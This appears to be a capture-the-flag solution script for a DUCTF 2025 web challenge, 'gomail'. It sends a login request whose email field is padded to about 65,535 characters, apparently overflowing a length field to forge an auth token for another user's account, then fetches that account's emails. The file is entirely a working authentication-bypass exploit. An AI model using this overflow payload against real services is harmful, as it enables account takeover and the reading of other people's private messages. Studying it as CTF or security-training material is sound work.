import requests

target = "https://web-gomail-3f344244ceb2.2025.ductf.net"

overflow_data = "mc-fat@monke.zip" + "z" * 8 + "t"


def build_payload() -> dict[str, str]:
    payload = {"email": overflow_data + "A" * ((1 << 16) - 9), "password": "anything"}
    return payload


def main():
    r = requests.post(target + "/login", json=build_payload())

    token = r.json()["token"]

    print(f"token: {token}")

    r = requests.get(target + "/emails", headers={"X-Auth-Token": token})

    print(r.text)


if __name__ == "__main__":
    main()
